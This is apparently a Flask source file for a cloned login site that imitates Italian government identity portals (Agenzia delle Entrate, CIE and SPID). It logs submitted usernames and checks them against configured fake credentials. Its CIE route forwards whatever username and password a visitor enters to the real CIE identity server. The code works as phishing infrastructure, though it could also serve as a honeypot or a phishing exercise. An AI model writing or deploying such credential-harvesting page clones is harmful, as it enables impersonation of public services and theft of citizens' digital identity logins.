from flask import Blueprint, render_template, request, redirect, url_for, session, current_app
import requests 

auth = Blueprint('auth', __name__)

@auth.route('/', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('IDToken1', '').strip()
        password = request.form.get('IDToken2', '').strip()
        
        fake_cf = current_app.config['FAKE_CODICE_FISCALE']
        fake_pw = current_app.config['FAKE_PASSWORD']
        
        if username == fake_cf and password == fake_pw:
            session['user'] = username
            current_app.logger.info(f"Login successful for user: {username}")
            return redirect(url_for('auth.dashboard')) 
        else:
            current_app.logger.info(f"Login failed for user: {username}")
            error = 'ASDFGHJKL'

    return render_template('agenzia.html', error=error)

@auth.route('/cie', methods=['GET', 'POST'])
def cie_login():
    error = None
    if request.method == 'POST':
        login_url = "https://idserver.servizicie.interno.gov.it/idp/login/livello2"
        username = request.form.get('IDToken1', '').strip()
        password = request.form.get('IDToken2', '').strip()
        
        credentials = {"username": username, "password": password}
        response = requests.post(login_url, data=credentials)
        current_app.logger.info(f"Response from CIE login: {response.status_code}")

    return render_template('cie.html', error=error)

@auth.route('/spid', methods=['GET', 'POST'])
def spid_login():
    error = None
    if request.method == 'POST':
        username = request.form.get('IDToken1', '').strip()
        password = request.form.get('IDToken2', '').strip()
        
        fake_cf = current_app.config['FAKE_CODICE_FISCALE']
        fake_pw = current_app.config['FAKE_PASSWORD']
        
        if username == fake_cf and password == fake_pw:
            session['user'] = username
            current_app.logger.info(f"SPID login successful for user: {username}")
            return redirect(url_for('auth.dashboard'))
        else:
            current_app.logger.info(f"SPID login failed for user: {username}")
            error = 'Le credenziali inserite non sono corrette.'

    return render_template('spid.html', error=error)

@auth.route('/logout')
def logout():
    current_app.logger.info("Logout successful")
    session.clear()
    return redirect(url_for('auth.login'))
